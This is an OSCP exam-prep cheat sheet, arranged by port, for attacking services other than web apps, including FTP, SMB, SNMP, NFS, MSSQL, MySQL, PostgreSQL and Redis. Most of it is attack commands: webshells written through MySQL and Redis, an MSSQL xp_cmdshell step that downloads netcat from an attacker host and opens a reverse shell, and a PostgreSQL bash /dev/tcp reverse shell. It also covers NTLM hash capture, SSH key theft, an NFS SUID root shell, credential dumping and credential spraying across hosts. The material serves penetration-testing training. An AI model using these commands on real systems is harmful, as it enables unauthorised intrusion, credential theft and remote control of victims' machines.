# OSCP NON-HTTP SERVICE ATTACK BIBLE

```
Everything that isn't a web app. Every port, every protocol.
Same format as the Web App Bible: what to look for, what to run, examples.
Organized by port number for fast Ctrl+F on exam day.
```

---

## PORT 21 — FTP

### What It Is
FTP (File Transfer Protocol) transfers files between systems. It's old, often misconfigured, and frequently the first foothold on OSCP machines because administrators leave anonymous access enabled or store sensitive files on it.

### How to Spot the Attack Surface
In your nmap output, look for:
```
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed        ← JACKPOT — instant access
| ftp-syst: STAT: FTP server status: ...
```

### Step 1 — Try Anonymous Access
```bash
# Method 1: traditional FTP client
ftp $IP
# Username: anonymous
# Password: (blank) or anonymous or anything@anything.com

# Method 2: if passive mode breaks (common issue)
ftp $IP
ftp> passive        ← toggle passive mode off
ftp> ls -la

# Method 3: lftp (handles passive mode better)
lftp -u anonymous, $IP
lftp> ls -la
lftp> mirror .      ← download everything recursively

# Method 4: wget recursive download
wget -m ftp://anonymous:@$IP
wget -m --no-passive ftp://anonymous:@$IP    ← if passive mode fails
```

**What to look for once you're in:**
```
Home directories (/home/user/)      → SSH keys, bash_history, config files
.mozilla/firefox/ profiles          → firefox_decrypt.py → cleartext passwords
.ssh/ directories                   → id_rsa private keys
Configuration files (.conf, .cfg)   → database passwords, API keys
Backup files (.bak, .zip, .tar.gz)  → old configs with creds
Database files (.mdb, .accdb, .db)  → credential tables
Documents (.pdf, .docx, .xlsx)      → may contain passwords or usernames
```

**Practice scenario:** In multiple practice attempts, a Linux standalone had FTP anonymous access with Firefox profile directories. `firefox_decrypt.py` extracted cleartext passwords that gave SSH access.

### Step 2 — Check if FTP is Writable + Connected to Web Root
```bash
ftp> put test.txt
# 226 Transfer complete? → FTP is WRITABLE

# If the FTP root is the web server's document root:
# Upload a PHP webshell:
ftp> binary                    ← IMPORTANT: switch to binary mode for non-text files
ftp> put shell.php
# Then visit: http://$IP/shell.php?cmd=id
```

This worked on: AuthBy (FTP upload to web dir), Loader

### Step 3 — Brute-Force FTP Credentials
```bash
# With known username
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 16

# With username list
hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt ftp://$IP

# Default credential list
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
```

### Step 4 — Check FTP Version for Exploits
```bash
# The nmap output tells you the version:
searchsploit vsftpd
searchsploit proftpd
searchsploit "microsoft ftpd"

# Notable FTP CVEs on OSCP machines:
# vsftpd 2.3.4    → Backdoor exploit (rare but check)
# ProFTPd 1.3.3c  → mod_copy allows unauthenticated file copy
# ProFTPd 1.3.5   → mod_copy RCE
```

### Step 5 — NTLM Theft via FTP (Windows Targets)
If FTP is writable on a Windows machine and users browse the share:
```bash
# Generate NTLM theft files
python3 ntlm_theft.py -g all -s $KALI -f evil

# Start Responder
sudo responder -I tun0 -vvv

# Upload via FTP
ftp> binary
ftp> mput evil*
# When a user browses the FTP directory → their NTLMv2 hash is captured
# Crack: hashcat -m 5600 hash.txt rockyou.txt
```

### Step 6 — Extract Metadata from Downloaded Files
```bash
# Any files you download from FTP — check metadata
exiftool -a -u downloaded_file.pdf
# May reveal: usernames, software versions, internal paths, email addresses
```

---

## PORT 22 — SSH

### What It Is
SSH provides encrypted remote shell access. It's rarely the direct vulnerability itself — instead, SSH is your entry point once you find credentials elsewhere. But there are important things to check.

### How to Spot the Attack Surface
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
```
Usually not directly exploitable. SSH is your destination, not your starting point.

### Step 1 — Note the Version (But Don't Waste Time Here)
```bash
searchsploit openssh
# Very rarely the foothold. Move on and come back with creds.
# Exception: OpenSSH < 7.7 user enumeration (CVE-2018-15473)
```

### Step 2 — Using Credentials You Found Elsewhere
```bash
# Password auth
ssh user@$IP
ssh user@$IP -p 2222              # non-standard port

# SSH key auth
chmod 600 id_rsa                   # MUST set permissions first
ssh -i id_rsa user@$IP

# If the key is encrypted (passphrase-protected):
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
# Then use the cracked passphrase when prompted

# If you get "no matching host key type":
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa user@$IP
```

### Step 3 — SSH Key Hunting (After Getting Access Elsewhere)
Once you have any foothold (web shell, FTP, LFI), look for SSH keys:
```bash
# Linux
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
ls -la /home/*/.ssh/
cat /home/*/.ssh/authorized_keys      # shows which users accept key auth

# Windows
dir /s /b C:\Users\*\.ssh\id_rsa 2>nul
type C:\Users\<user>\.ssh\id_rsa
```

### Step 4 — SSH Port Forwarding (Critical for Privesc)
When you find internal-only services after getting a shell:
```bash
# Local port forward: access target's internal port via your localhost
ssh -L 8080:127.0.0.1:8080 user@$IP -N
# Now browse http://localhost:8080 to reach the target's internal web app

# Dynamic SOCKS proxy: route all traffic through the target
ssh -D 1080 user@$IP -N
# Configure /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains curl http://internal-host:8080

# Remote port forward: make target's internal port reachable on your Kali
ssh -R 9090:127.0.0.1:8080 kali@$KALI -N
# Now browse http://localhost:9090 on Kali
```

---

## PORT 25 / 587 — SMTP

### What It Is
SMTP (Simple Mail Transfer Protocol) sends email. On OSCP machines, it's useful for user enumeration and occasionally direct exploitation.

### How to Spot the Attack Surface
```
25/tcp open  smtp    OpenSMTPD
25/tcp open  smtp    Postfix smtpd
25/tcp open  smtp    Microsoft ESMTP
```

### Step 1 — User Enumeration
SMTP can confirm whether usernames exist on the system:
```bash
# Automated
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP

# Manual via nc/telnet
nc -nv $IP 25
VRFY admin             ← 252 = user exists, 550 = doesn't exist
VRFY root
VRFY www-data

# RCPT TO method (if VRFY is disabled)
nc -nv $IP 25
HELO test
MAIL FROM: <test@test.com>
RCPT TO: <admin@domain.htb>       ← 250 = exists, 550 = doesn't
RCPT TO: <bob@domain.htb>
```

### Step 2 — Check for Exploits
```bash
searchsploit opensmtpd
searchsploit postfix
searchsploit sendmail

# OpenSMTPD < 6.6.2 — RCE (CVE-2020-7247) — Bratarina machine
# This is a direct shell via crafted MAIL FROM command
# searchsploit -m 47984

# Sendmail + ClamAV milter — RCE (CVE-2007-4560) — ClamAV machine
```

### Step 3 — Send Phishing Emails (If Client-Side Attack Required)
```bash
# Send email with attachment
swaks -t victim@domain.htb --from attacker@domain.htb \
  --server $IP --attach @payload.odt \
  --body "Please review the attached document" \
  --header "Subject: Urgent Review"

# Send with library-ms phishing payload
swaks -t victim@domain.htb --from john@domain.htb \
  --server $IP --attach @config.Library-ms \
  --body @body.txt --header "Subject: Important Files"
```

---

## PORT 53 — DNS

### What It Is
DNS resolves domain names to IPs. On OSCP, it reveals hidden subdomains and internal hostnames through zone transfers.

### Step 1 — Zone Transfer (Try This Immediately)
```bash
# A zone transfer dumps ALL DNS records — instant subdomain enumeration
dig axfr @$IP domain.htb
# If it works, you'll see hostnames, IPs, mail servers, etc.

# Alternative tool
dnsrecon -d domain.htb -n $IP -t axfr

# Reverse lookup (find hostnames from IPs)
dig -x $IP @$IP
```

### Step 2 — Subdomain Brute-Force
```bash
# If you have a domain name but zone transfer failed
gobuster dns -d domain.htb -r $IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Add any discovered subdomains to /etc/hosts!
echo "$IP newsubdomain.domain.htb" >> /etc/hosts
```

---

## PORT 79 — FINGER

### What It Is
Finger is an ancient protocol that reveals information about logged-in users. Extremely rare but appeared on Sunday (HTB).

### How to Enumerate
```bash
# List logged-in users
finger @$IP

# Check specific users
finger admin@$IP
finger root@$IP

# Brute-force usernames
finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
```
**Machine:** Sunday (Finger → found users → SSH brute on port 22022)

---

## PORT 88 — KERBEROS

### What It Is
Port 88 means Active Directory. If you see this, you're dealing with a Domain Controller.

### This Port Signals "AD Set" — Use Your AD Methodology
Kerberos isn't attacked directly via the port. Instead, you interact with it via tools:

### AS-REP Roasting (No Creds Required — Just Usernames)
```bash
# If you have a list of valid usernames:
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip $IP -format hashcat -outputfile asrep.hash

# Crack the hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
**Machines:** Forest, Sauna, Blackfield

### Kerberoasting (Requires Any Domain Creds)
```bash
impacket-GetUserSPNs domain.local/user:pass -dc-ip $IP -request -outputfile tgs.hash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt --force
```
**Machines:** Active (Administrator SPN)

### Username Enumeration via Kerbrute
```bash
kerbrute userenum -d domain.local --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

---

## PORTS 110 / 143 / 993 / 995 — POP3 / IMAP (Email)

### What It Is
These let you read email from a mailbox. On OSCP, you usually get creds from elsewhere and then check email for more creds or clues.

### Reading Email via POP3 (Port 110)
```bash
nc -nv $IP 110
USER username
PASS password
LIST                   ← show all messages
RETR 1                 ← read message 1
RETR 2                 ← read message 2 (check ALL of them)
```

### Reading Email via IMAP (Port 143)
```bash
nc -nv $IP 143
A1 LOGIN username password
A2 LIST "" "*"                        ← list mailboxes
A3 SELECT INBOX                       ← open inbox
A4 FETCH 1:* (BODY[HEADER.FIELDS (SUBJECT FROM)])    ← list subjects
A5 FETCH 1 BODY[]                     ← read full message 1
```

### What to Look For in Emails
```
Passwords sent in plaintext
SSH keys or certificates as attachments
Links to internal services
Usernames of other employees
IT support tickets with credential resets
```
**Machines:** Solidstate (Apache James → create user → read POP3 mail → find creds), Access (Outlook .pst → creds)

---

## PORT 111 / 2049 — NFS

### What It Is
NFS (Network File System) shares directories over the network. When misconfigured, anyone can mount and read (or write to) shared directories.

### Step 1 — List Available Shares
```bash
showmount -e $IP
# Example output:
# /home   *                    ← home directory shared to everyone!
# /backup (everyone)           ← backup files
```

### Step 2 — Mount and Explore
```bash
mkdir /tmp/nfs
sudo mount -t nfs $IP:/home /tmp/nfs -o nolock

# Browse the mounted share
ls -la /tmp/nfs/
# Look for: SSH keys, config files, credentials, .bash_history
```

### Step 3 — SSH Key Theft
```bash
# If you find .ssh/id_rsa in a user's home directory:
cp /tmp/nfs/user/.ssh/id_rsa /tmp/stolen_key
chmod 600 /tmp/stolen_key
ssh -i /tmp/stolen_key user@$IP
```

### Step 4 — Check for no_root_squash
```bash
# If exports show no_root_squash:
# You can write files as root to the NFS share
# Create a SUID binary:
cp /bin/bash /tmp/nfs/user/suid_bash
chmod +s /tmp/nfs/user/suid_bash
# On target: /home/user/suid_bash -p    → root shell
```
**Machine:** Remote (NFS mount → Umbraco DB → admin hash → RCE)

---

## PORTS 135 / 139 / 445 — SMB

### What It Is
SMB (Server Message Block) is Windows file sharing. It's one of the most important protocols on the OSCP — it appears on almost every Windows machine and many AD sets.

### Step 1 — Null Session / Guest Access (No Creds Needed)
```bash
# Try ALL of these — different tools find different results
smbclient -L //$IP -N                                    # list shares
smbmap -H $IP                                            # check permissions
smbmap -H $IP -u '' -p ''                                # null session
smbmap -H $IP -u 'guest' -p ''                           # guest access
nxc smb $IP -u '' -p '' --shares                         # null with nxc
nxc smb $IP -u 'guest' -p '' --shares                    # guest with nxc
enum4linux -a $IP                                         # full enumeration

# RPC null session (enumerate users/groups)
rpcclient -U '' -N $IP
> enumdomusers                    ← list all domain users
> enumdomgroups                   ← list all groups
> querydispinfo                   ← detailed user info
> queryuser 500                   ← query Administrator (RID 500)
> getdompwinfo                    ← password policy
```

### Step 2 — Download EVERYTHING from Accessible Shares
```bash
# Interactive browsing
smbclient //$IP/ShareName -N               # anonymous
smbclient //$IP/ShareName -U 'user%pass'   # authenticated

# Download entire share recursively
smbclient //$IP/ShareName -U 'user%pass' -c 'recurse on; prompt off; mget *'

# Recursive listing (see all files without downloading)
smbmap -H $IP -u 'user' -p 'pass' -R

# OR mount it locally
sudo mount -t cifs //$IP/ShareName /mnt/smb -o user=user,password=pass
```

### What to Look For in SMB Shares
```
SYSVOL/Policies/    → Groups.xml with cpassword → gpp-decrypt
NETLOGON/           → login scripts with hardcoded creds
IT/Admin shares     → config files, scripts, backups
User home dirs      → SSH keys, KeePass databases, browser profiles
.mdb / .accdb       → Access databases — open with mdbtools or on Windows
.xlsx / .docx       → Spreadsheets and docs may contain creds in plaintext
.kdbx               → KeePass database → keepass2john → crack
.pst                → Outlook data file → readpst -o output file.pst → emails
Scripts (.ps1/.bat) → Hardcoded passwords in automation scripts
web.config          → IIS connection strings
```

### Step 3 — GPP Password Extraction (AD Gold)
```bash
# Automated checks
nxc smb $IP -u user -p pass -M gpp_autologin
nxc smb $IP -u user -p pass -M gpp_password

# Manual: download SYSVOL and search
smbclient //$IP/SYSVOL -U 'user%pass' -c 'recurse on; prompt off; mget *'
find . -name "Groups.xml" -o -name "*.xml" | xargs grep -li cpassword

# Decrypt
gpp-decrypt "cpassword_value_here"
```
**Machines:** Active, Querier

### Step 4 — Writable Share → Webshell or NTLM Theft
```bash
# Check for write access
smbmap -H $IP -u 'user' -p 'pass'
# Look for WRITE in the permissions column

# If writable + connected to web root → drop webshell
smbclient //$IP/wwwroot -U 'user%pass'
> put shell.php

# If writable + users browse → NTLM theft
python3 ntlm_theft.py -g all -s $KALI -f evil
smbclient //$IP/WritableShare -U 'user%pass'
> mput evil*
# Start Responder: sudo responder -I tun0
```

### Step 5 — SMB Vulnerability Scanning
```bash
nmap -p445 --script smb-vuln* $IP
# EternalBlue (MS17-010) — Windows 7/Server 2008 R2
# Check but unlikely on modern OSCP machines
```

### Step 6 — Authenticated Credential Harvesting
```bash
# With valid creds, dump everything:
nxc smb $IP -u user -p pass --sam             # local hashes
nxc smb $IP -u user -p pass --lsa             # LSA secrets (cleartext!)
nxc smb $IP -u user -p pass -M lsassy         # LSASS dump
impacket-secretsdump user:pass@$IP            # all-in-one dump
```

---

## PORT 161 (UDP) — SNMP

### What It Is
SNMP (Simple Network Management Protocol) monitors network devices. On OSCP, it leaks usernames, running processes (with command-line arguments including passwords), and sometimes the full configuration of the system.

### Why It Matters
SNMP runs on UDP (easy to miss if you skip UDP scans). It has dumped cleartext credentials on multiple OSCP machines. **Always check UDP 161.**

### Step 1 — Find the Community String
```bash
# Default community strings: public, private, manager
# Brute-force:
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP

# Or just try the common ones directly:
snmpwalk -v2c -c public $IP 2>/dev/null | head -20
snmpwalk -v2c -c private $IP 2>/dev/null | head -20
```

### Step 2 — Full SNMP Walk
```bash
# Dump everything
snmpwalk -v2c -c public $IP

# Bulk walk (faster)
snmpbulkwalk -v2c -c public $IP

# Target specific high-value OIDs:
# Windows usernames
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25

# Running processes (may show command lines with passwords!)
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2

# TCP listening ports
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3

# Network interfaces
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.2.2.1.2

# Extended output (sometimes contains script output with passwords)
snmpwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

### What to Look For in SNMP Output
```
Running processes with arguments:
  /usr/bin/python3 /opt/app/run.py --password=SecretPass123
  java -Ddb.password=admin123 -jar app.jar
  
Usernames from Windows user enumeration

Software versions (searchsploit them)

Network info revealing internal subnets

Script output containing API keys or tokens
```

**Machines:** Pandora (SNMP → cleartext creds → SSH), Monitored (SNMP → Nagios API key)

---

## PORT 389 / 636 — LDAP

### What It Is
LDAP stores directory information (users, groups, computers) in Active Directory. It's your primary reconnaissance tool once you have domain creds, and sometimes leaks data even without creds.

### Step 1 — Anonymous Bind (No Creds)
```bash
# Try anonymous access — sometimes it works
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local"

# Specifically look for users and their descriptions
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" '(objectClass=person)' sAMAccountName description

# Get the base DN if you don't know the domain:
ldapsearch -x -H ldap://$IP -b "" -s base namingContexts
```

### Step 2 — Authenticated Enumeration (With Creds)
```bash
# Full user dump
ldapsearch -x -H ldap://$IP -D 'user@domain.local' -w 'password' \
  -b "DC=domain,DC=local" '(objectClass=person)' sAMAccountName description memberOf

# Check description fields for passwords!
# Cicada, Certified, and Puppy machines all had passwords in LDAP descriptions
ldapsearch -x -H ldap://$IP -D 'user@domain.local' -w 'pass' \
  -b "DC=domain,DC=local" '(description=*)' sAMAccountName description
```

### Step 3 — Using nxc for LDAP
```bash
# Password-in-description hunting (automated)
nxc ldap $IP -u user -p pass -M get-desc-users

# User enumeration
nxc ldap $IP -u user -p pass --users
```

**Machines:** Certified (password in description), Puppy (password in description), Hutch (LDAP creds → WebDAV)

---

## PORT 1433 — MSSQL

### What It Is
Microsoft SQL Server. On OSCP, MSSQL is a Swiss Army knife: it can steal NTLM hashes, execute system commands, and read/write files.

### Step 1 — Connect with Credentials
```bash
# With impacket (preferred)
impacket-mssqlclient user:pass@$IP
impacket-mssqlclient user:pass@$IP -windows-auth     # domain auth
impacket-mssqlclient sa:sa@$IP                        # default sa account

# Or with sqsh
sqsh -S $IP -U user -P pass
```

### Step 2 — Enable xp_cmdshell → RCE
This is the most direct path to a shell from MSSQL:
```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'dir C:\Users\';

-- Reverse shell via PowerShell
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4A...BASE64...';

-- Or download and execute
EXEC xp_cmdshell 'certutil -urlcache -f http://KALI/nc.exe C:\Users\Public\nc.exe';
EXEC xp_cmdshell 'C:\Users\Public\nc.exe KALI 443 -e cmd.exe';
```

### Step 3 — NTLM Hash Theft (Start Responder First!)
```bash
# On Kali: start Responder
sudo responder -I tun0

# In MSSQL session:
EXEC xp_dirtree '\\KALI_IP\share';
# Or:
EXEC xp_subdirs '\\KALI_IP\share';

# Responder captures NTLMv2 hash → crack with hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```
**Machines:** Querier (xp_dirtree), Giddy (xp_dirtree), Escape (xp_dirtree → silver ticket)

### Step 4 — Read Files
```sql
-- Read local files
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\flag.txt', SINGLE_CLOB) AS x;
```

### Step 5 — Check for Linked Servers
```sql
-- List linked servers (can execute commands on OTHER SQL servers)
EXEC sp_linkedservers;

-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME];
```

---

## PORT 3306 — MySQL

### What It Is
MySQL database. On OSCP, you either find creds for it or brute-force default credentials, then extract user tables or escalate to RCE.

### Step 1 — Try Default Credentials
```bash
mysql -h $IP -u root -p                  # try blank password
mysql -h $IP -u root -proot
mysql -h $IP -u root -ptoor
mysql -h $IP -u admin -padmin
mysql -h $IP -u root -ppassword
```

### Step 2 — Enumerate and Extract
```sql
-- List databases
SHOW DATABASES;

-- Use a database
USE webapp;

-- List tables
SHOW TABLES;

-- Dump credentials
SELECT * FROM users;
SELECT username, password FROM users;
```

### Step 3 — MySQL → File Read / Write
```sql
-- Read files (need FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

-- Write webshell (need FILE privilege + know web root)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";
-- Then visit: http://$IP/shell.php?cmd=id
```

### Step 4 — MySQL UDF (Running as Root → RCE)
If MySQL runs as root (check with `SELECT user();`):
```bash
# Use UDF (User Defined Function) exploit
searchsploit mysql udf
# Compile and load a shared library that executes system commands
```
**Machine:** Pebbles (MySQL running as root → UDF exploitation)

---

## PORT 3389 — RDP

### What It Is
Remote Desktop Protocol for Windows. You connect when you have Windows credentials.

### Step 1 — Connect with Credentials
```bash
# Standard connection with clipboard and shared drive
xfreerdp +clipboard /u:user /p:'password' /v:$IP /dynamic-resolution /cert-ignore /drive:shared,/home/kali/tools

# Domain user
xfreerdp +clipboard /u:domain\\user /p:'password' /v:$IP /dynamic-resolution /cert-ignore

# With NTLM hash (pass-the-hash)
xfreerdp +clipboard /u:administrator /pth:NTLM_HASH /v:$IP /cert-ignore
```

### CRITICAL: "ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED"
```
This does NOT mean the password is wrong!
The password IS VALID but RDP requires a password change.
RDP won't let you in, but OTHER protocols will:

evil-winrm -i $IP -u user -p 'password'
impacket-smbexec domain/user:'password'@$IP
impacket-wmiexec domain/user:'password'@$IP
impacket-psexec domain/user:'password'@$IP

# Or change the password:
smbpasswd -r $IP -U user
impacket-changepasswd domain/user:'oldpass'@$IP -newpass 'NewP@ssw0rd!'
```
**Practice scenario:** You found expired RDP creds on a Windows standalone and abandoned the machine. Those creds likely worked on WinRM. That was 10-20 points.

### Step 2 — Vulnerability Scanning
```bash
# BlueKeep (CVE-2019-0708) — Windows 7 / Server 2008
nmap -p3389 --script rdp-vuln-ms12-020 $IP
```

---

## PORT 5432 — PostgreSQL

### What It Is
PostgreSQL database. Similar to MySQL but with different syntax and its own RCE paths.

### Step 1 — Connect
```bash
psql -h $IP -U postgres                   # try default user
psql -h $IP -U postgres -W                # prompt for password
# Try: blank, postgres, admin, password
```

### Step 2 — Enumerate and Extract
```sql
-- List databases
\l

-- Connect to database
\c database_name

-- List tables
\dt

-- Dump credentials
SELECT * FROM users;
```

### Step 3 — PostgreSQL → RCE
```sql
-- Direct command execution (if superuser)
COPY (SELECT '') TO PROGRAM 'id';

-- More reliable: create a table, execute, read output
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- Reverse shell
COPY cmd_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/KALI/443 0>&1"';
```
**Machine:** Nibbles PG (PostgreSQL default creds → command execution)

---

## PORT 5985 / 5986 — WinRM

### What It Is
Windows Remote Management. If you have valid Windows creds or an NTLM hash, WinRM gives you a PowerShell session.

### Step 1 — Check Access
```bash
nxc winrm $IP -u user -p 'password'
nxc winrm $IP -u user -H 'NTLM_HASH'
# Look for: (Pwn3d!) in the output — means you can get a shell
```

### Step 2 — Get a Shell
```bash
# With password
evil-winrm -i $IP -u user -p 'password'
evil-winrm -i $IP -u user -p 'password' -d domain.local

# With NTLM hash (pass-the-hash)
evil-winrm -i $IP -u administrator -H 'NTLM_HASH'

# Upload/download files within evil-winrm:
upload /home/kali/tools/winpeas.exe
download C:\Users\Administrator\Desktop\proof.txt
```

### Key Insight
WinRM only works if the user is in the **Remote Management Users** group (or Administrators). Always check this when setting up persistence:
```powershell
net localgroup "Remote Management Users" newuser /add
```

---

## PORT 6379 — REDIS

### What It Is
Redis is an in-memory database/cache. When exposed without authentication, it's a direct path to RCE.

### Step 1 — Check for Unauthenticated Access
```bash
redis-cli -h $IP
> INFO                            # server info
> CONFIG GET dir                  # current directory
> CONFIG GET dbfilename           # current DB filename
> KEYS *                          # list all keys
> GET <key>                       # read a key's value
```

### Step 2 — Redis → Webshell (If Web Root Known)
```bash
redis-cli -h $IP
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET payload "<?php system($_GET['cmd']); ?>"
> SAVE
# Visit: http://$IP/shell.php?cmd=id
```

### Step 3 — Redis → SSH Key Write
```bash
# Generate SSH keypair
ssh-keygen -t rsa -f /tmp/redis_key -N ""

# Pad the key with newlines (Redis adds garbage around it)
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/padded_key.txt

# Write to Redis
cat /tmp/padded_key.txt | redis-cli -h $IP -x SET sshkey

# Set dir and save
redis-cli -h $IP
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SAVE

# Connect
ssh -i /tmp/redis_key root@$IP
```

### Step 4 — Redis Rogue Server (Direct RCE)
```bash
# Use redis-rogue-server for direct command execution
# CRITICAL FIX: Change gb18030 → utf-8 in the script (common gotcha)
python3 redis-rogue-server.py --rhost $IP --rport 6379 --lhost $KALI --lport 21000 --exp exp.so
```
**Machines:** Sybaris (Redis → cron), Readys (Redis + cron), your a practice attempt .110 (Redis rogue server)

---

## PORT 3128 — SQUID PROXY

### What It Is
Squid is an HTTP proxy. It can be used to access internal services that aren't directly reachable from your Kali box.

### How to Use It
```bash
# Access internal services through the proxy
curl --proxy http://$IP:3128 http://127.0.0.1:80
curl --proxy http://$IP:3128 http://127.0.0.1:8080

# Scan internal ports through the proxy
# Use proxychains: add to /etc/proxychains4.conf:
# http $IP 3128
proxychains curl http://127.0.0.1:8080

# Brute-force internal ports
for PORT in 80 443 3306 8080 8443 5000 9090; do
  echo "Port $PORT:"
  curl -s --proxy http://$IP:3128 http://127.0.0.1:$PORT -o /dev/null -w "%{http_code}\n" --max-time 3
done
```

---

## PORTS 5800 / 5900 — VNC

### What It Is
VNC provides graphical remote desktop access. Sometimes accessible with weak or default passwords.

### Step 1 — Connect
```bash
vncviewer $IP::5900
vncviewer $IP::5901

# If password-protected, try common passwords:
# password, admin, vnc, <blank>
```

### Step 2 — Crack VNC Password File
```bash
# If you find the password file (usually via LFI or file read):
# Linux: ~/.vnc/passwd
# Windows: various registry locations

# Decrypt with vncpwd
vncpwd ~/.vnc/passwd
```

---

## UNCOMMON BUT IMPORTANT PORTS

### Port 113 — IDENT
```bash
# Reveals which user owns a process on a specific port
ident-user-enum -M ALL -I $IP -p 113
# Found username? → try it as SSH password (user=password)
```

### Port 873 — RSYNC
```bash
# List modules
rsync --list-only rsync://$IP/
# Download everything
rsync -avz rsync://$IP/modulename ./rsync-loot/
# May contain: config files, home directories, credentials
```

### Port 1978 / 9099 — RemoteMouse
```bash
searchsploit remotemouse
# Unauthenticated RCE via crafted packets
```

### Port 5357 — WSD (Web Services for Devices)
```bash
# Windows service discovery — sometimes reveals OS info
# Check for MS09-050 if SMB version is old
```

### Port 11211 — Memcached
```bash
# Connect and dump cached data
echo "stats" | nc $IP 11211
echo "stats items" | nc $IP 11211
echo "stats cachedump 1 100" | nc $IP 11211
# Cached data may include session tokens, passwords, API keys
```

### Port 27017 — MongoDB
```bash
# Connect without authentication
mongosh --host $IP
# Or with older client:
mongo --host $IP

# Enumerate
show dbs
use <database>
show collections
db.<collection>.find()
# Look for user collections with passwords
```

---

## THE CREDENTIAL PIPELINE — EVERY SERVICE FEEDS THIS

```
Regardless of which service you're attacking, every credential
goes through the same pipeline:

FOUND CREDS → Add to master_creds.txt → SPRAY ALL 6 MACHINES

for IP in $IP1 $IP2 $IP3 $IP4 $IP5 $IP6; do
  nxc smb $IP -u 'USER' -p 'PASS' 2>/dev/null
  nxc winrm $IP -u 'USER' -p 'PASS' 2>/dev/null
  nxc rdp $IP -u 'USER' -p 'PASS' 2>/dev/null
  nxc ssh $IP -u 'USER' -p 'PASS' 2>/dev/null
done

FOUND HASH → Add to master_hashes.txt → SPRAY ALL MACHINES

for IP in $IP1 $IP2 $IP3 $IP4 $IP5 $IP6; do
  nxc smb $IP -u 'USER' -H 'HASH' 2>/dev/null
  nxc winrm $IP -u 'USER' -H 'HASH' 2>/dev/null
done

This is the single most important behavior change.
It's worth 10-20 points based on your 4 attempts.
```

---

## SERVICE PRIORITY ORDER ON EXAM DAY

```
When nmap finishes, attack services in this order:

1. FTP (21)      → Anonymous access? Download everything. (30 seconds)
2. SMB (445)     → Null/guest session? Download shares. (2 minutes)
3. SNMP (161)    → snmpwalk for cleartext creds. (1 minute)
4. NFS (2049)    → Mount shares, steal SSH keys. (1 minute)
5. LDAP (389)    → Anonymous bind? Description passwords? (1 minute)
6. MSSQL (1433)  → Default creds? xp_cmdshell? NTLM theft? (2 minutes)
7. MySQL (3306)  → Default creds? Dump user tables. (1 minute)
8. Redis (6379)  → Unauth access? Rogue server RCE. (1 minute)
9. SSH (22)      → Save for when you have creds.
10. RDP (3389)   → Save for when you have creds.
11. WinRM (5985) → Save for when you have creds.

Everything above takes ~10 minutes total.
Then move to web enumeration on HTTP ports.
```
